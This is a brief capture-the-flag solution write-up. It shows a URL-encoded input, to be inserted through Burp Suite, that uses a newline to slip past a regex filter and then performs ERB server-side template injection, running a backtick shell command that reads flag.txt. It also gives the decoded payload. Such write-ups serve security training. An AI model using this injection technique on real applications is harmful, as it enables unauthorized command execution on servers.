# Solution

Capture the request with burpsuite and insert the input below directly in the burpsuite input parameter:
```
%20a%20%0Ab%3C%25%3D%20%60cat%20flag.txt%20%60%20%25%3E^_`aaa
```
this is the same as:

```
 a 
b<%= `cat flag.txt ` %>^_`aaa
```

# References

- https://github.com/attackercan/regexp-security-cheatsheet